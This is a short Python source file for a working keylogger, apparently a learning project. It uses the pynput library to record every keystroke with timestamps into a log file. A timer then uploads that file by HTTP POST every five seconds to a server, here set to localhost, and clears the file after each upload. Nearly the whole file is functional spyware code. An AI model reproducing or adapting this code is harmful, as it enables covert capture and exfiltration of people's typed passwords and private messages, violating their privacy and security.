#TODO: Handle exceptions

#From keyboard subpackage in Pynput library, importing Listener class
#keyboard subpackage contains classes for controlling and accessing keyboard
from pynput.keyboard import Listener 
from threading import Timer
import logging
import time
import requests

KEYLOG_FILE = "keylogs.log"

#sending file to the server(local host) through post request
def send_file():
    url = 'http://127.0.0.1:5000/'
    files = {'file':open(KEYLOG_FILE,'rb')}
    req = requests.post(url, files = files)
    #if deleting the keystrokes, some keystrokes would get deleted right? since
    #the user'd  be entering some in after the file gets sent to server and the file gets deleted
    #we might be deleting the new keystrokes right
    if(req.status_code == 200):
        open(KEYLOG_FILE, "w").close()
    Timer(5, send_file).start()
    
#logging the keystroke
def on_press(key):
    logging.info(key)

#setting the configuration for the logging 
logging.basicConfig(format = '%(asctime)s:%(message)s', filename = KEYLOG_FILE, encoding = 'utf-8', level = logging.INFO)

#Listener is a threading.Thread object and all the callbacks would be invoked from that thread
with Listener(on_press = on_press) as listener:
    Timer(5, send_file).start()
    listener.join()